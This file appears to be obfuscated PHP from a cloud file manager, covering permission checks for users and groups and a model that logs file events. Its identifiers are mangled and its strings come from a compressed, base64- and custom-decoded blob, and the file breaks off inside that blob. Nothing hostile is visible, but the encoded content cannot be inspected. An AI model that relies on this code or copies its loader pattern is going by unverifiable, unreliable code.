$this->sourceAuthInfo($„à½ÖËĞ[$íçßùÂ¿[2010]]); } return $„à½ÖËĞ; } public function authArrayCheck($ÅõÀº©Â, $ù›÷’” = false) { $ôú úá× =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$ÅõÀº©Â) { return array($ôú úá×[415] => 0, $ôú úá×[466] => !1); } $ù›÷’” = $ù›÷’” ? $ù›÷’” : USER_ID; $¶‹™´ºĞ = 0; $ÕÅàæˆî = 0; $±®°¶½… = 0; $‘Úôíòğ = 0; $öºğ€İ = 0; $„½ÜÄ¿› = 0; $°Éëá­œ = 1000; $Å´“„Á = 0; $ğáœêØö = 0; $™û¿ş“‹ = 0; $¯Ô²¬á = 0; $Ÿ¸……³¾ = array($ôú úá×[403] => 0); foreach ($ÅõÀº©Â as $Ÿ¸……³¾) { $åĞ€Šòİ = $this->authInfo($Ÿ¸……³¾); if (!$åĞ€Šòİ) { continue; } $¥¸ñã¨÷ = $Ÿ¸……³¾[$ôú úá×[504]]; $ú¡Ø‹“Î = intval($åĞ€Šòİ[$ôú úá×[414]]); if ($Ÿ¸……³¾[$ôú úá×[412]] == SourceModel::TYPE_USER && $¥¸ñã¨÷ == $ù›÷’”) { $¶‹™´ºĞ = !0; $±®°¶½… = $åĞ€Šòİ; $ÕÅàæˆî = $ú¡Ø‹“Î; } else { if ($Ÿ¸……³¾[$ôú úá×[412]] == SourceModel::TYPE_GROUP && $this->groupContainUser($¥¸ñã¨÷, $ù›÷’”)) { $‘Úôíòğ = !0; $¨’¿¬“á = $this->groupStepToUserGroup($¥¸ñã¨÷, $ù›÷’”); if ($¨’¿¬“á < $°Éëá­œ) { $°Éëá­œ = $¨’¿¬“á; $öºğ€İ = $ú¡Ø‹“Î; $„½ÜÄ¿› = $åĞ€Šòİ; $Å´“„Á = $¥¸ñã¨÷; } if ($¨’¿¬“á == $°Éëá­œ && $ú¡Ø‹“Î >= $öºğ€İ) { $öºğ€İ = $ú¡Ø‹“Î; $„½ÜÄ¿› = $åĞ€Šòİ; $Å´“„Á = $¥¸ñã¨÷; } } else { if ($¥¸ñã¨÷ == $ôú úá×[190]) { $ğáœêØö = !0; $¯Ô²¬á = $åĞ€Šòİ; $™û¿ş“‹ = $ú¡Ø‹“Î; } } } } if ($¶‹™´ºĞ) { $ì¡ßàÏÏ = $ÕÅàæˆî; $åĞ€Šòİ = $±®°¶½…; $­¿¢Ù¢Ã = LNG($ôú úá×[2011]); } else { if ($‘Úôíòğ) { $ì¡ßàÏÏ = $öºğ€İ; $åĞ€Šòİ = $„½ÜÄ¿›; $Êı¥Æ‹™ = Model($ôú úá×[522])->getInfo($Å´“„Á); $­¿¢Ù¢Ã = $ôú úá×[159] . $Êı¥Æ‹™[$ôú úá×[526]] . $ôú úá×[2012] . LNG($ôú úá×[2013]); } else { if ($ğáœêØö) { $ì¡ßàÏÏ = $™û¿ş“‹; $åĞ€Šòİ = $¯Ô²¬á; $­¿¢Ù¢Ã = LNG($ôú úá×[1984]); } else { $ì¡ßàÏÏ = 0; $åĞ€Šòİ = !1; $­¿¢Ù¢Ã = $ôú úá×[12]; } } } $óàö·ä = array($ôú úá×[2003] => intval($ì¡ßàÏÏ), $ôú úá×[1987] => $åĞ€Šòİ, $ôú úá×[2004] => $­¿¢Ù¢Ã, $ôú úá×[1996] => $Ÿ¸……³¾[$ôú úá×[403]]); return $óàö·ä; } private function groupContainUser($ã›Ìæƒ, $·®ÛÃè­ = false) { return in_array($ã›Ìæƒ, $this->userGroupParents($·®ÛÃè­)); } private function groupStepToUserGroup($ûµ†şû, $ƒğÍ‹‡ø = false) { $²À÷¦Í© =& $_SERVER[¥Ÿ©ÒèÌ]; $ï™ĞÄ â = $this->userGroupList($ƒğÍ‹‡ø); $Êª§úÚã = 1000; $æ¯›“Ş¥ = $GLOBALS[$²À÷¦Í©[6]][$²À÷¦Í©[90]][$²À÷¦Í©[1907]] == 1; $¤ŒæğÎ• = $æ¯›“Ş¥ ? 3 : 2; foreach ($ï™ĞÄ â as $ğ·Ä×ø¤) { if ($ğ·Ä×ø¤[$²À÷¦Í©[1807]] == $ûµ†şû) { return 0; } $ÕÙ·Ü = explode($²À÷¦Í©[50], trim($ğ·Ä×ø¤[$²À÷¦Í©[521]], $²À÷¦Í©[50])); if ($ÕÙ·Ü[0] == $²À÷¦Í©[190] && count($ÕÙ·Ü) > $¤ŒæğÎ•) { $Ç¡×ø¡ = array_reverse(array_slice($ÕÙ·Ü, $¤ŒæğÎ•)); $ôï¶èø— = array_search($ûµ†şû, $Ç¡×ø¡); if ($ôï¶èø— !== !1 && $ôï¶èø— + 1 <= $Êª§úÚã) { $Êª§úÚã = $ôï¶èø— + 1; } } } return $Êª§úÚã; } private function userGroupList($¯ĞÅ²…× = false) { $ÀÕß‚ =& $_SERVER[¥Ÿ©ÒèÌ]; static $í…Œ¦Û = array(); if (isset($í…Œ¦Û[$¯ĞÅ²…×])) { return $í…Œ¦Û[$¯ĞÅ²…×]; } $±¥é€¯± = Model($ÀÕß‚[538])->getInfo($¯ĞÅ²…×); $í…Œ¦Û[$¯ĞÅ²…×] = array_to_keyvalue($±¥é€¯±[$ÀÕß‚[1985]], $ÀÕß‚[1807]); return $í…Œ¦Û[$¯ĞÅ²…×]; } public function userGroupParents($ŞóÃôÆ) { $¸à«’éË =& $_SERVER[¥Ÿ©ÒèÌ]; static $²®¹¤ô = array(); $ŞóÃôÆ = $ŞóÃôÆ ? $ŞóÃôÆ : USER_ID; if (isset($²®¹¤ô[$ŞóÃôÆ])) { return $²®¹¤ô[$ŞóÃôÆ]; } $Úëµš€í = $this->userGroupList($ŞóÃôÆ); $¡Œ—·­Ÿ = array(); $ø·Î¹½ = $GLOBALS[$¸à«’éË[6]][$¸à«’éË[90]][$¸à«’éË[1907]] == 1; $Ğ¶ ÕÑ = $ø·Î¹½ ? 3 : 2; foreach ($Úëµš€í as $÷´ˆ“Ô—) { $–ÂÕ¹ºì = array($÷´ˆ“Ô—[$¸à«’éË[1807]]); $é¢şÃ´¬ = explode($¸à«’éË[50], trim($÷´ˆ“Ô—[$¸à«’éË[521]], $¸à«’éË[50])); if ($é¢şÃ´¬[0] == $¸à«’éË[190] && count($é¢şÃ´¬) > $Ğ¶ ÕÑ) { $ˆ¶Û¼€ = array_slice($é¢şÃ´¬, $Ğ¶ ÕÑ); $–ÂÕ¹ºì = array_merge($–ÂÕ¹ºì, array_reverse($ˆ¶Û¼€)); } $¡Œ—·­Ÿ = array_merge($¡Œ—·­Ÿ, $–ÂÕ¹ºì); } $²®¹¤ô[$ŞóÃôÆ] = array_unique($¡Œ—·­Ÿ); return $²®¹¤ô[$ŞóÃôÆ]; } public function authTargetInfoMake($¸äšÉìî) { $®À‰ß¿ =& $_SERVER[¥Ÿ©ÒèÌ]; $ÙÙµİª½ = array(); $ø›öĞ©¹ = array(); foreach ($¸äšÉìî as $ÉäØ™³) { if ($ÉäØ™³[$®À‰ß¿[412]] == SourceModel::TYPE_USER) { $ÙÙµİª½[] = intval($ÉäØ™³[$®À‰ß¿[504]]); } else { if ($ÉäØ™³[$®À‰ß¿[412]] == SourceModel::TYPE_GROUP) { $ø›öĞ©¹[] = intval($ÉäØ™³[$®À‰ß¿[504]]); } } } if ($ÙÙµİª½) { $ÙÙµİª½ = Model($®À‰ß¿[513])->userListInfo($ÙÙµİª½); } if ($ø›öĞ©¹) { $‡‘òÂà = array($®À‰ß¿[1894] => array($®À‰ß¿[419], $ø›öĞ©¹)); $ø›öĞ©¹ = Model($®À‰ß¿[522])->field($®À‰ß¿[2014])->where($‡‘òÂà)->select(); $ø›öĞ©¹ = array_to_keyvalue($ø›öĞ©¹, $®À‰ß¿[1807]); } return array($®À‰ß¿[2015] => $ÙÙµİª½, $®À‰ß¿[2016] => $ø›öĞ©¹); } public function authInfo($æûß—Ãó) { $¾“–Ó° =& $_SERVER[¥Ÿ©ÒèÌ]; if ($æûß—Ãó[$¾“–Ó°[1908]]) { $ş£‹Ûö = Model($¾“–Ó°[507])->listData($æûß—Ãó[$¾“–Ó°[1908]]); if (!$ş£‹Ûö) { return !1; $àóŠòĞ… = Model($¾“–Ó°[507])->listData(); $ Àé·È¡ = array_filter_by_field($àóŠòĞ…, $¾“–Ó°[414], $¾“–Ó°[190]); return $ Àé·È¡; } $…¦ã”ãË = array_field_key($ş£‹Ûö, array($¾“–Ó°[401], $¾“–Ó°[32], $¾“–Ó°[414], $¾“–Ó°[1829], $¾“–Ó°[1830])); $…¦ã”ãË[$¾“–Ó°[2017]] = $æûß—Ãó; return $…¦ã”ãË; } else { return array($¾“–Ó°[420] => 0, $¾“–Ó°[1813] => $æûß—Ãó[$¾“–Ó°[1962]], $¾“–Ó°[421] => $¾“–Ó°[12], $¾“–Ó°[1829] => $¾“–Ó°[2018]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\x6f\165\x72\x63\145\x5f\x65\166\145\156\164"; protected $dataAuto = array(array("\143\x72\x65\x61\x74\145\124\151\x6d\x65", "\164\x69\155\145", "\x69\x6e\163\x65\x72\164", "\x66\165\x6e\x63\164\x69\157\x6e"), array("\x64\x65\x73\x63", '', "\x69\156\x73\x65\x72\164\54\x75\160\x64\x61\x74\x65\x2c\163\145\x6c\x65\x63\164", "\152\163\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($­õÖé‚¿, $ÀÔ³ßÙ¯, $ÛµæèŒ­ = '') { $¯Ûóæ—´ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$this->eventSave) { return; } $Âƒ· °¤ = Model($¯Ûóæ—´[1311])->sourceInfo($­õÖé‚¿); if (!$Âƒ· °¤) { return !1; } if ($this->isCacheEvent($Âƒ· °¤, $ÀÔ³ßÙ¯)) { return; } if ($ÛµæèŒ­ && is_string($ÛµæèŒ­)) { $ÛµæèŒ­ = array($¯Ûóæ—´[1845] => $ÛµæèŒ­); } $Á´âÆÜš = array($¯Ûóæ—´[418] => $­õÖé‚¿, $¯Ûóæ—´[2019] => $Âƒ· °¤[$¯Ûóæ—´[498]], $¯Ûóæ—´[2020] => $Âƒ· °¤[$¯Ûóæ—´[32]], $¯Ûóæ—´[519] => !empty($Âƒ· °¤[$¯Ûóæ—´[519]]) ? $Âƒ· °¤[$¯Ûóæ—´[519]] : $¯Ûóæ—´[12], $¯Ûóæ—´[1630] => USER_ID, $¯Ûóæ—´[423] => $ÀÔ³ßÙ¯, $¯Ûóæ—´[1632] => $ÛµæèŒ­); $this->addSystemLog($ÀÔ³ßÙ¯, $Á´âÆÜš); unset($Á´âÆÜš[$¯Ûóæ—´[2020]], $Á´âÆÜš[$¯Ûóæ—´[519]]); return $this->add($Á´âÆÜš); } private function addSystemLog($ğŠµ†‡ë, $ªºêê¶) { $üóïÈ¾ =& $_SERVER[¥Ÿ©ÒèÌ]; if ($ğŠµ†‡ë == $üóïÈ¾[2021]) { $ğŠµ†‡ë = $ªºêê¶[$üóïÈ¾[451]][$üóïÈ¾[2022]]; } else { if (in_array($ğŠµ†‡ë, array($üóïÈ¾[1787], $üóïÈ¾[2023]))) { $ğŠµ†‡ë = $ªºêê¶[$üóïÈ¾[451]][$üóïÈ¾[745]]; } } $—ÄÓğÕ = array_merge($ªºêê¶, array($üóïÈ¾[2024] => $ªºêê¶[$üóïÈ¾[403]], $üóïÈ¾[2025] => $ªºêê¶[$üóïÈ¾[2025]])); Hook::trigger($üóïÈ¾[2026], $üóïÈ¾[2027] . $ğŠµ†‡ë, $ªºêê¶); Model($üóïÈ¾[1751])->addLog($üóïÈ¾[2027] . $ğŠµ†‡ë, $—ÄÓğÕ); } private function isCacheEvent($ï›©Ç«, $ª­™¬¤¡) { if ($ï›©Ç«[$_SERVER[¥Ÿ©ÒèÌ][412]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($®ÚÛıİ·, $¿ßíÉıñ) { $Æ»ãä»¯ =& $_SERVER[¥Ÿ©ÒèÌ]; $¬ÃŸ£´ò = Model($Æ»ãä»¯[1311])->sourceInfo($®ÚÛıİ·); $å¸ÇÁ†Ú = array($Æ»ãä»¯[2022] => $¿ßíÉıñ, $Æ»ãä»¯[32] => $¬ÃŸ£´ò[$Æ»ãä»¯[32]]); return $this->addEvent($®ÚÛıİ·, $Æ»ãä»¯[2021], $å¸ÇÁ†Ú); } public function eventFileEdit($Â«‘Ãßõ) { $‡Ø”·ùÑ =& $_SERVER[¥Ÿ©ÒèÌ]; $Ÿ½ğÜ¼ = array($‡Ø”·ùÑ[2028] => $_SERVER[$‡Ø”·ùÑ[2029]], $‡Ø”·ùÑ[2030] => strtolower(ACTION)); return $this->addEvent($Â«‘Ãßõ, $‡Ø”·ùÑ[1777], $Ÿ½ğÜ¼); } public function eventRecycle($–šù”å, $åÕŸÇÒÔ) { return $this->addEvent($–šù”å, $_SERVER[¥Ÿ©ÒèÌ][2023], $åÕŸÇÒÔ); } public function eventRemove($ø°Œ€—) { $íºä‹¤ğ =& $_SERVER[¥Ÿ©ÒèÌ]; $ÑÏ•¸³í = Model($íºä‹¤ğ[1311])->sourceInfo($ø°Œ€—); $£’İ›Öµ = $ÑÏ•¸³í[$íºä‹¤ğ[32]]; return $this->addEvent($ÑÏ•¸³í[$íºä‹¤ğ[498]], $íºä‹¤ğ[1776], $£’İ›Öµ); } public function eventShare($ê˜¡¿”ş, $çóˆ¨ïÓ) { return $this->addEvent($ê˜¡¿”ş, $_SERVER[¥Ÿ©ÒèÌ][1787], $çóˆ¨ïÓ); } public function eventMove($Ï¦ğÙ‘, $ñ™ß´Ñ, $û—ñ¸³) { $ô†°¬©• =& $_SERVER[¥Ÿ©ÒèÌ]; $‹Ò—š—À = Model($ô†°¬©•[1311]); $äëê“ğÄ = $‹Ò—š—À->sourceInfo($Ï¦ğÙ‘); $¹¶áÆôã = $‹Ò—š—À->sourceInfo($ñ™ß´Ñ); $äÑ¢‡¤ = $‹Ò—š—À->sourceInfo($û—ñ¸³); $”ÄÔü‰Ï = array($ô†°¬©•[1144] => $ñ™ß´Ñ, $ô†°¬©•[2031] => $¹¶áÆôã[$ô†°¬©•[32]], $ô†°¬©•[2010] => !empty($¹¶áÆôã[$ô†°¬©•[519]]) ? $¹¶áÆôã[$ô†°¬©•[519]] : $ô†°¬©•[12], $ô†°¬©•[1145] => $û—ñ¸³, $ô†°¬©•[2032] => $äÑ¢‡¤[$ô†°¬©•[32]], $ô†°¬©•[2033] => !empty($äÑ¢‡¤[$ô†°¬©•[519]]) ? $äÑ¢‡¤[$ô†°¬©•[519]] : $ô†°¬©•[12]); $this->addEvent($Ï¦ğÙ‘, $ô†°¬©•[551], $”ÄÔü‰Ï); $äëê“ğÄ = $‹Ò—š—À->sourceInfo($Ï¦ğÙ‘); $”ÄÔü‰Ï = array($ô†°¬©•[403] => $äëê“ğÄ[$ô†°¬©•[403]], $ô†°¬©•[32] => $äëê“ğÄ[$ô†°¬©•[32]]); $this->addEvent($ñ™ß´Ñ, $ô†°¬©•[2034], $”ÄÔü‰Ï); } public function eventCopy($óœæù÷) { $this->eventCreate($óœæù÷, $_SERVER[¥Ÿ©ÒèÌ][549]); } public function eventRename($ÑÚî¼Ëš, $¸®ù±šú, $“œÜ¨âĞ) { $ªÉİºñĞ =& $_SERVER[¥Ÿ©ÒèÌ]; $â¢ªµ‰İ = array($ªÉİºñĞ[1144] => $¸®ù±šú, $ªÉİºñĞ[1145] => $“œÜ¨âĞ); return $this->addEvent($ÑÚî¼Ëš, $ªÉİºñĞ[1326], $â¢ªµ‰İ); } public function eventAddComment($€ê¦Úµş, $Âş¸à¤) { return $this->addEvent($€ê¦Úµş, $_SERVER[¥Ÿ©ÒèÌ][2035], $Âş¸à¤); } public function eventAddDesc($óÇ›÷êˆ, $€á§Œ——) { return $this->addEvent($óÇ›÷êˆ, $_SERVER[¥Ÿ©ÒèÌ][2036], $€á§Œ——); } public function listBySource($Ûâù½õ) { $Ø´å©Ì’ =& $_SERVER[¥Ÿ©ÒèÌ]; $Ò¾ƒõë¥ = Model($Ø´å©Ì’[1311])->sourceInfo($Ûâù½õ); $–¸íîÖ÷ = array($Ø´å©Ì’[418] => $Ûâù½õ); if ($Ò¾ƒõë¥[$Ø´å©Ì’[411]] == $Ø´å©Ì’[89]) { $˜€œÏ Å = Model($Ø´å©Ì’[1311])->listSearchChildren($Ûâù½õ, 20000); $˜€œÏ Å[] = $Ûâù½õ . $Ø´å©Ì’[382]; $–¸íîÖ÷ = array($Ø´å©Ì’[403] => array($Ø´å©Ì’[7], $˜€œÏ Å)); } $İ¦ëûŠ„ = $this->where($–¸íîÖ÷)->order($Ø´å©Ì’[2037])->selectPage(); if ($İ¦ëûŠ„[$Ø´å©Ì’[370]][$Ø´å©Ì’[371]] == 0) { $İ¦ëûŠ„[$Ø´å©Ì’[370]][$Ø´å©Ì’[371]] = 1; $İ¦ëûŠ„[$Ø´å©Ì’[373]] = array(array($Ø´å©Ì’[418] => $Ûâù½õ, $Ø´å©Ì’[2019] => $Ò¾ƒõë¥[$Ø´å©Ì’[498]], $Ø´å©Ì’[1630] => $Ò¾ƒõë¥[$Ø´å©Ì’[452]], $Ø´å©Ì’[423] => $Ø´å©Ì’[2038], $Ø´å©Ì’[424] => $Ò¾ƒõë¥[$Ø´å©Ì’[193]], $Ø´å©Ì’[1632] => $Ø´å©Ì’[12])); } return $this->eventListParse($İ¦ëûŠ„, $Ûâù½õ); } private function eventListParse($Õõªí¸Ä, $–€°ÆªË) { $‰¶àûÛ× =& $_SERVER[¥Ÿ©ÒèÌ]; $ŒÑÊ™˜ë = $Õõªí¸Ä[$‰¶àûÛ×[373]]; $öí€Ñ‡ = array_to_keyvalue($ŒÑÊ™˜ë, $‰¶àûÛ×[12], $‰¶àûÛ×[403]); $à¼Õ€ = array_to_keyvalue($ŒÑÊ™˜ë, $‰¶àûÛ×[12], $‰¶àûÛ×[2025]); foreach ($ŒÑÊ™˜ë as $Æœ“¸®Õ) { $§¶ô³ü‚ = $Æœ“¸®Õ[$‰¶àûÛ×[451]]; if ($Æœ“¸®Õ[$‰¶àûÛ×[33]] == $‰¶àûÛ×[551] && isset($§¶ô³ü‚[$‰¶àûÛ×[1144]])) { $öí€Ñ‡[] = $§¶ô³ü‚[$‰¶àûÛ×[1144]] . $‰¶àûÛ×[12]; $öí€Ñ‡[] = $§¶ô³ü‚[$‰¶àûÛ×[1145]] . $‰¶àûÛ×[12]; } if ($Æœ“¸®Õ[$‰¶àûÛ×[33]] == $‰¶àûÛ×[2034] && isset($§¶ô³ü‚[$‰¶àûÛ×[403]])) { $öí€Ñ‡[] = $§¶ô³ü‚[$‰¶àûÛ×[403]] . $‰¶àûÛ×[12]; } } $öí€Ñ‡ = array_merge($öí€Ñ‡, $à¼Õ€, array($–€°ÆªË . $‰¶àûÛ×[12])); $öí€Ñ‡ = array_unique($öí€Ñ‡); $©è®é€ = array_unique(array_to_keyvalue($ŒÑÊ™˜ë, $‰¶àûÛ×[12], $‰¶àûÛ×[1639])); $Œ‡‚ÖÈÕ = Model($‰¶àûÛ×[538])->userListInfo($©è®é€); $¥™ŸÙæë = Model($‰¶àûÛ×[815])->sourceListInfo($öí€Ñ‡, !0); foreach ($ŒÑÊ™˜ë as &$Æœ“¸®Õ) { if ($Æœ“¸®Õ[$‰¶àûÛ×[33]] == $‰¶àûÛ×[551] && isset($Æœ“¸®Õ[$‰¶àûÛ×[451]][$‰¶àûÛ×[1144]])) { $Æœ“¸®Õ[$‰¶àûÛ×[451]][$‰¶àûÛ×[1144]] = $¥™ŸÙæë[$Æœ“¸®Õ[$‰¶àûÛ×[451]][$‰¶àûÛ×[1144]]]; $Æœ“¸®Õ[$‰¶àûÛ×[451]][$‰¶àûÛ×[1145]] = $¥™ŸÙæë[$Æœ“¸®Õ[$‰¶àûÛ×[451]][$‰¶àûÛ×[1145]]]; } if ($Æœ“¸®Õ[$‰¶àûÛ×[33]] == $‰¶àûÛ×[2034] && isset($Æœ“¸®Õ[$‰¶àûÛ×[451]][$‰¶àûÛ×[403]])) { $Æœ“¸®Õ[$‰¶àûÛ×[451]][$‰¶àûÛ×[403]] = $¥™ŸÙæë[$Æœ“¸®Õ[$‰¶àûÛ×[451]][$‰¶àûÛ×[403]]]; } $Æœ“¸®Õ[$‰¶àûÛ×[87]] = $¥™ŸÙæë[$Æœ“¸®Õ[$‰¶àûÛ×[403]]]; $Æœ“¸®Õ[$‰¶àûÛ×[2039]] = $¥™ŸÙæë[$Æœ“¸®Õ[$‰¶àûÛ×[2025]]]; if ($Æœ“¸®Õ[$‰¶àûÛ×[33]] == $‰¶àûÛ×[1776]) { $Æœ“¸®Õ[$‰¶àûÛ×[2039]] = $Æœ“¸®Õ[$‰¶àûÛ×[87]]; $Æœ“¸®Õ[$‰¶àûÛ×[2025]] = $Æœ“¸®Õ[$‰¶àûÛ×[2039]][$‰¶àûÛ×[403]]; $Æœ“¸®Õ[$‰¶àûÛ×[87]] = !1; $Æœ“¸®Õ[$‰¶àûÛ×[403]] = $‰¶àûÛ×[12]; } $Æœ“¸®Õ[$‰¶àûÛ×[1970]] = $Œ‡‚ÖÈÕ[$Æœ“¸®Õ[$‰¶àûÛ×[1639]]]; } unset($Æœ“¸®Õ); $Õõªí¸Ä[$‰¶àûÛ×[373]] = $ŒÑÊ™˜ë; return $Õõªí¸Ä; } public function removeBySource($¢ãõ¬Ó¶) { $ù½î© = array($_SERVER[¥Ÿ©ÒèÌ][418] => $¢ãõ¬Ó¶); $this->where($ù½î©)->remove(); } } goto c’ªÔêÊ‹—; AïÄ§¶ó®…: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\xa5\x9f\xa9\xd2\xe8\xcc", "\xf6\xf0\xb6\xd2\xd7\x93"); $_SERVER[¥Ÿ©ÒèÌ] = explode("\174\4\174\4\174\1", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xcd\xbd\x79\x7c\x1b\xc5\xf9\x30\xe\x84\xbb\x2d\x3d\xb8\x5a\x28\x65\x31\x49\x7c\x44\x87\xe3\xd8\x39\x9c\x38\x89\x6c\xcb\xb6\x88\x2c\x39\x92\x9c\x3"."\73\50\153\151\145\155\54\151\345\335\225\257\44\120\156\132\110\112\113\241\34\51\120\150\71\132\22\240\234\55\367\221\2\245\100\276\155\241\11\264\264\100\22\22\216\226\253"."\224\263\274\163\74\163\354\112\206\357\357\363\173\377\170\3\211\146\236\71\166\216\147\236\171\236\147\236\171\346\221\337\156\333\271\365\241\165\373\243\377\366\175\340\322\127\317"."\372\365\367\151\30\375\67\5\375\45\341\343\317\77\170\37\362\347\360\363\277\137\123\323\65\373\320\31\221\57\377\340\366\315\352\115\352\26\365\202\150\370\311\77\204\276\362"."\xf4\x4d\x27\x5\x77\x5f\xfb\xe4\xf8\xee\x7d\xf7\x79\xb3\xfe\xb8\xa7\x9b\x51\x66\x5a\xb6\x99\xfe\x28\x5\xc3\x56\xb4\x31\xdd\xb2\x2d\xa\x48\x19\x85\x8c\x3e\x48\xc3\x7a\x81\xfe\xfa\xe9\x4f"."\x6f\x2c\x6c\x6a\x79\xc3\xd6\x68\xd4\x47\x7f\x92\xd0\x2e\xf2\xaf\x35\x9c\xd3\x59\x7a\x32\x12\x4d\x24\xe3\xbd\x3d\x3d\xc1\x58\x2\x32\x35\xcb\xe9\x79\x23\xd\xa1\xa2\x6a\xaa\x79\xf8\x7e\x51"."\63\55\324\32\271\272\144\321\50\152\5\7\104\0\322\252\255\16\250\26\324\324\336\232\154\17\366\204\243\53\223\211\225\75\101\310\61\220\34\56\151\346\70\215\221\140\334".base64_decode('Vk07oec1nmPU5O1qDXaGIkoiFojEA22JUDRCwW3R7u5Qohwei4bDrYG2JeUpPbE=')."\100\147\167\100\101\355\313\151\111\275\220\61\152\224\325\64\145\265\122\113\3\35\272\226\113\323\140\101\145\315\261\307\213\20\112\360\20\232\246\102\51\227\243\221\10\17\245".strrev('Kl0xª ­BšÚªm˜à‘¢½'."\r".'²Z€Ò‡8Ú%éÖUç©¢‘ËµhÁÊZŒµ')."\x28\xb8\x81\x4a\x47\x2c\xda\xad\xc0\x24\xe4\x55\xcb\xd6\x4c\x65\x79\x57\x30\x16\x54\x70\xa3\x5b\xaa\x49\x5f\xab\x15\xc0\x97\x8\x1a\xa\x25\x10\xe\x2b\x93\xd5\x60\x6b\xf9\x22\xab\x86\x96"."\251\120\131\64\326\36\214\51\255\53\25\61\102\51\43\237\67\12\76\124\13\232\111\133\152\152\60\26\243\1\17\240\167\70\204\47\15\42\321\216\216\170\220\307\240\163\113"."\xc3\xa8\x25\xb3\x0\x3f\x1d\xb1\x74\x26\x67\x27\x47\xd4\x5c\x89\xa1\xe9\x10\xfd\xad\x86\x1f\xf8\x35\x2c\x40\xdd\x61\xbd\xa0\x97\x0\x4d\xa1\xa\xc3\xe0\xcb\xa\x2\x25\x96\x5b\x63\x10\x2d".base64_decode('DYE8Km/AykPLcIQGWxbS3/mQaSCJ0zTTTmqFlJHWC7BYFwHSqXa23dRRBqjJ8KU=').base64_decode('jOJ4tzECvcjoOS3MV1jGyKU1U8SLqLicAt3RJ6TSkVJezsKjqayeS5tsYX5eTrQ=')."\364\365\314\270\130\200\226\121\62\123\132\10\55\21\121\266\207\267\144\46\144\322\154\33\365\326\142\375\352\55\346\14\65\35\327\114\251\257\35\250\140\264\144\313\300\22\311"."\xd6\x61\x98\xf9\x76\x44\x2a\xe0\xfb\x68\x99\xe8\xbd\x15\x12\x86\xd8\x42\x49\x4b\x43\xe8\xaf\xe9\x3b\xdd\xfb\xdf\x55\x7d\x8b\xd1\x3f\xb5\x40\xb\xfb\xa1\x4d\x59\x2d\x97\x4b\x6a\x63\x1a\xac"."\244\174\272\311\142\235\364\133\3\172\301\217\40\64\32\212\46\263\252\225\355\116\67\45\111\51\150\162\41\255\215\371\212\331\42\215\212\65\336\357\300\164\74\55\21\303\16"."\112\204\72\147\244\324\234\334\105\32\316\332\166\61\256\25\322\170\44\240\53\306\150\201\214\124\121\323\40\123\273\107\111\53\335\312\112\245\253\131\157\266\130\301\174\216\207"._kodDe('K+JLvysz1f9umEPxfbibQVWcQmGp7we9OV/JWKKNjqz9nPZZh9FMlimOU8E5uw7Y')."\x8c\x51\x6f\xd4\xd4\x7\xf5\x42\xb3\x52\x47\xf3\xe0\x44\xb4\x82\xbd\x98\xda\x35\xc3\xb2\xac\x9a\xaf\x60\x24\xc0\x4b\xbe\xae\xa5\x64\x67\xbc\x73\xd9\x72\xe3\xb9\x4d\xb5\x60\x65\x34\xd3\x1b"."\204\145\320\254\240\361\346\44\217\145\153\327\255\242\141\351\270\171\315\212\152\333\152\52\213\311\205\250\276\145\35\320\300\242\156\152\26\373\276\322\331\235\200\212\120\11\315"."\xdb\x63\xaa\x83\x79\xb5\x59\x29\x96\x6\x50\x6f\x61\xa9\x55\x80\xd1\xdc\xd0\xdd\x66\x25\x85\xa3\x1e\x25\x5f\xb2\x6c\xaf\xa9\x21\x5a\xa2\xa3\xfd\xa\xe6\x25\x94\xf1\x76\xe3\x75\xa0\x6b\x69".strrev('¢ğ®%^Rsk êÛf‚ëh;²`‘©í¨d‰»B,+TĞToªÏ'."\0".'\\‘o')."\xf5\x80\x91\x21\x82\xfa\x2a\x80\x3d\xc6\xa8\x66\xa2\xf\xb7\x8e\x37\x2b\x43\x46\x7a\xc0\x18\xf3\xb1\x24\x9c\x39\x8e\x16\x3c\xcb\x8c\xa7\xb0\x68\x7b\x63\x6a\x61\x10\x8f\xcf\xc0\xb8\xad\x1"."\312\130\43\203\316\301\16\153\205\101\73\313\12\306\203\261\145\301\130\62\36\355\110\54\17\304\140\67\56\240\231\37\143\237\302\125\347\274\61\55\215\206\76\145\263\162\152"."\x11\x8f\x1a\xcb\x83\x91\x19\xcf\x15\x4b\xc5\x8\xce\xd2\xc2\xa1\x4e\x3c\x30\xed\x5e\xb\x65\xf2\xca\xb9\x58\xdd\x61\x3d\xaf\xe3\xb6\xdb\x3c\x85\x8c\x24\xda\xaa\x3b\xa1\x41\x7e\xd2\xa1\x96".base64_decode('/mxdTX96Rq0X/VtX29ff7qtbtcivizL+mb6ZSkP9bKUH8Q66mlOg02U56pXoEuc=')."\260\10\14\55\30\5\355\163\6\7\157\76\322\62\165\15\53\5\306\202\113\173\203\361\104\262\73\230\350\212\266\303\327\203\1\10\205\15\272\24\131\157\373\350\317\52\230"."\xdd\xc\xa5\x8f\xa1\xbc\x3a\xe8\x22\xb7\x38\xd6\x6d\x98\x9a\x13\xb2\x8e\x93\xff\xe5\x7a\x9a\xd1\x63\x1c\xed\xd2\xf4\xc1\x2c\xf4\x5d\xc7\xb5\xa5\x8c\x9c\x61\xaa\x39\x4c\x95\x18\x82\x6b\x8c".base64_decode('UgzqGZg7SgBFJK7ni4xO2dlSfkAKAqW1EC6wfSJr8H3KMCHU7IeM0xo6YGFF/fE=')."\x59\xe8\x7f\x41\x56\xd3\x46\x5e\x65\xcc\x2c\x21\x41\x5a\x9a\xd2\x20\xa\xaa\x73\xa4\x74\x69\xaa\xd8\xf8\x6c\xd3\x36\x30\xd4\x74\x64\xe9\xd6\xec\xac\x1\x93\x34\xa8\xb1\x26\x95\x78\xdb\x58"."\53\323\132\116\143\243\221\325\30\211\256\207\154\150\213\341\143\225\341\344\32\261\136\10\52\366\106\335\212\241\222\230\25\142\361\345\230\127\2